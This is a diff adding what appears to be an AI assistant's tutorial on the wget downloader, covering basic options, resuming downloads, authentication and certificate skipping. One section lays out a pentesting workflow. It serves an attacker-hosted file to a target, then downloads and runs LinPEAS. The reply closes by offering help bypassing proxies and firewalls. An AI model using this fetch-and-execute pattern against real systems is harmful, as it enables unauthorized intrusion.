@@ -1,0 +1,165 @@
+Great question! Let’s dive into using **`wget`**, a versatile command-line utility on **Linux** (and sometimes Windows, via Cygwin or WSL) for downloading files from the internet.
+
+Here’s a **step-by-step guide**, including the most common use cases and the exact commands you can use.
+
+---
+
+## 🔹 What is `wget`?
+
+`wget` is a non-interactive network downloader that can fetch files using HTTP, HTTPS, or FTP protocols. It’s built into most Linux distributions and is commonly used for quick file downloads.
+
+---
+
+## 🔹 Basic Usage
+
+### 1️⃣ Download a File
+
+**Syntax:**
+
+```bash
+wget <URL>
+```
+
+**Example:**
+
+```bash
+wget http://example.com/file.txt
+```
+
+This downloads `file.txt` into the current directory.
+
+---
+
+## 🔹 Common Use Cases
+
+### ➡️ Download to a Specific Filename
+
+```bash
+wget -O custom_name.txt http://example.com/file.txt
+```
+
+---
+
+### ➡️ Download into a Specific Directory
+
+```bash
+wget -P /tmp http://example.com/file.txt
+```
+
+---
+
+### ➡️ Download in Background
+
+```bash
+wget -b http://example.com/file.txt
+```
+
+The download happens in the background, and logs are written to `wget-log`.
+
+---
+
+### ➡️ Resume an Interrupted Download
+
+```bash
+wget -c http://example.com/largefile.zip
+```
+
+---
+
+### ➡️ Download All Files Recursively (like an entire directory)
+
+```bash
+wget -r http://example.com/files/
+```
+
+---
+
+### ➡️ Download Over HTTPS (if needed)
+
+```bash
+wget --no-check-certificate https://example.com/file.txt
+```
+
+*(Use `--no-check-certificate` if there’s an SSL/TLS certificate error — useful in CTFs and lab environments but not recommended in production.)*
+
+---
+
+## 🔹 Advanced Usage
+
+### ➡️ Download with User-Agent Spoofing
+
+```bash
+wget --user-agent="Mozilla/5.0" http://example.com/file.txt
+```
+
+---
+
+### ➡️ Download with Basic Auth
+
+```bash
+wget --user=username --password=password http://example.com/securefile.txt
+```
+
+---
+
+## 🔹 Typical Workflow for Pentesting
+
+1️⃣ **Start an HTTP server on your attacker machine (optional)**:
+
+```bash
+python3 -m http.server 8000
+```
+
+2️⃣ **On the target Linux system, download a file**:
+
+```bash
+wget http://<attacker-ip>:8000/linpeas.sh -O /tmp/linpeas.sh
+```
+
+3️⃣ **Make it executable**:
+
+```bash
+chmod +x /tmp/linpeas.sh
+```
+
+4️⃣ **Run it**:
+
+```bash
+/tmp/linpeas.sh
+```
+
+---
+
+## 🔹 Summary of Useful Commands
+
+```bash
+# Basic download
+wget http://example.com/file.txt
+
+# Specify filename
+wget -O myfile.txt http://example.com/file.txt
+
+# Download to a directory
+wget -P /tmp http://example.com/file.txt
+
+# Resume interrupted download
+wget -c http://example.com/largefile.zip
+
+# Ignore SSL certificate
+wget --no-check-certificate https://example.com/file.txt
+
+# Download with authentication
+wget --user=username --password=password http://example.com/securefile.txt
+```
+
+---
+
+## 🔹 Notes
+
+✅ `wget` is extremely handy for transferring tools like LinPEAS, payloads, or even binaries in pentesting labs.
+✅ For downloading on Windows, consider using PowerShell (`Invoke-WebRequest` or `certutil`).
+✅ Always **verify permissions** and have explicit **authorization** when downloading files in any environment.
+
+---
+
+Let me know if you’d like to explore automating downloads, chaining with other tools, or bypassing some common restrictions (like proxies or firewalls). 🚀
